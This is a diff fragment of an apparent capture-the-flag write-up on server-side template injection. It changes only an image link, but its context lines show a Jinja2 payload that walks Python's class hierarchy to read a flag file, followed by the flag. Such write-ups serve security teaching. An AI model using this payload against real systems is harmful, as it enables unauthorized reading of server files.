@@ -16,6 +16,6 @@ It worked! Next thing to do was to find where the flag was stored,
 {{ ''.__class__.__mro__[2].__subclasses__()[40]("flag.txt").read() }}
 ```
 And it worked!
-![Flag](2.png)
+![Flag](3.png)
 
 > ### LLS{server_side_template_injection_unmasked}
